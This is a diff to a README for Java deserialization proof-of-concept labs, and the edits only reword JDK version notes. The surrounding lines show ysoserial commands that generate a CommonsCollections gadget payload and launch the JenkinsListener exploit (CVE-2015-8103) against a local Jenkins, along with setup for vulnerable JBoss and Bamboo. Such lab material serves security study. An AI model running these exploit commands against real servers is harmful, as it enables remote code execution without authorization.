@@ -6,7 +6,7 @@ These pocs use the [ysoserial](https://github.com/frohoff/ysoserial/) tool to ge
 
 Minimal Example
 ---------------------------------
-- Use java 8
+- Use OpenJDK 1.8
 ```
 cd MinimalExample
 java -jar ../ysoserial-master-v0.0.5-gb617b7b-16.jar CommonsCollections6 "/tmp/exploit.sh">payload.ser 
@@ -21,9 +21,8 @@ java -classpath .:apache-collections-commons-collections-3.1.jar DeSerializingOb
 JBOSS (CVE-2016-7065)
 ---------------------------------
 
-
+- Use OpenJDK 1.8
 - Download a vulnerable version of Jboss (in this case you can find the v5.1.0) 
-- Check if you have installed the JDK 1.8
 - Run jboss: ```java -jar ./JBoss/jboss-5.1.0.GA/bin/run.jar```
 - Download and open Burp: setup your proxy on localhost:9090
 - In your browser start proxy on localhost:9090
@@ -36,9 +35,8 @@ JBOSS (CVE-2016-7065)
 
 Jenkins (CVE-2015-8103)
 ---------------------------------
-
+- Use OpenJDK 1.8
 - Download a vulnerable version of Jenkins (in this case you can find the v1.649)
-- Check if you have installed the JDK 1.8
 ```
 java -jar ./jenkins-war-1.649.war
 java -cp ysoserial-master-v0.0.5-gb617b7b-16.jar ysoserial.exploit.JenkinsListener http://localhost:8080 CommonsCollections5 "touch /tmp/JenkinsVulnerable.txt"
@@ -48,7 +46,7 @@ java -cp ysoserial-master-v0.0.5-gb617b7b-16.jar ysoserial.exploit.JenkinsListen
 Bamboo (CVE-2015-6576)
 ---------------------------------
 
-- Download and install openjdk 1.7 
+- Use openJDK 1.7
 - Download and install vulnerable version of Bamboo (v5.4.3 in this case) 
 - Create folder /home/user/bamboohome/
 - Add/update the property /Bamboo/atlassian-bamboo-5.4.3/atlassian-bamboo/WEB-INF/classes/bamboo-init.properties with
